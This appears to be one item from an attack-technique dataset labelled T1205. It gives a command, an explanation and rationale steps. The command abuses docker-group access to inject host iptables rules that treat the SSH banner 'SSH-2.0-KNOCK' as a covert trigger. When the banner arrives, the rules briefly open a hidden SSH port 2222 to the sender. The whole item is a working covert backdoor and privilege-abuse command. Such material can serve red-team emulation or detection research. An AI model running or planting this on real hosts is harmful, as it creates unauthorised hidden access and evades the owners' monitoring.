command: docker run --rm --net=host --cap-add=NET_ADMIN alpine sh -c "apk add --no-cache iptables >/dev/null && iptables -I INPUT -p tcp --dport 22 -m string --string 'SSH-2.0-KNOCK' --algo bm -j LOG --log-prefix 'T1205_SSH_BANNER ' --log-level 4 && iptables -I INPUT -p tcp --dport 22 -m string --string 'SSH-2.0-KNOCK' --algo bm -m recent --name t1205_ssh --set && iptables -I INPUT -p tcp --dport 2222 -m recent --name t1205_ssh --rcheck --seconds 30 --reap -j ACCEPT"
explanation: Leverages the SSH client banner 'SSH-2.0-KNOCK' as an application-specific signal. Upon seeing it on port 22, the rule logs the packet and briefly opens a hidden SSH port 2222 for the source IP.
rationale_steps: Use docker to inject iptables rules into the host from docker_group context.
Detect a crafted SSH identification string to serve as a covert trigger.
Temporarily allow alternate SSH port 2222 for the signaling IP.
